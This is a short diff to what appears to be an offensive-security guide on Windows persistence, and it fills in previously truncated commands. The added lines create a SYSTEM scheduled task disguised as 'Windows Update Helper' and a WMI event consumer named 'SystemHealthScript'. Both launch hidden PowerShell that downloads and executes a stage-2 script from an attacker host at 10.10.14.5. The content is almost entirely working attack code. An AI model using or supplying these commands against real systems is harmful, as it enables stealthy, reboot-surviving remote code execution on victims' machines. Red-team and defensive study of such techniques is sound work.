@@ -305,8 +305,9 @@ curl -X POST \
 Classic on-prem persistence remains relevant for hybrid environments.
 
 ```powershell
-# Scheduled task persistence (survives reboots)
-schtasks /create /tn "Windows Update Helper" /tr "powershell -w hidden -c IEX..." \
+# Scheduled task persistence (survives reboots).
+# Fetches a base64-encoded stage-2 PowerShell payload from attacker infrastructure and executes it.
+schtasks /create /tn "Windows Update Helper" /tr "powershell -w hidden -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')\"" \
     /sc ONLOGON /ru SYSTEM /f
 
 # WMI event subscription (fileless persistence)
@@ -320,7 +321,7 @@ $filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" 
 $consumer = Set-WmiInstance -Namespace "root\subscription" -Class "ActiveScriptEventConsumer" -Arguments @{
     Name = "SystemHealthScript"
     ScriptingEngine = "VBScript"
-    ScriptText = "CreateObject(""WScript.Shell"").Run ""powershell -w hidden ..."""
+    ScriptText = "CreateObject(""WScript.Shell"").Run ""powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')"", 0, False"
 }
 
 Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
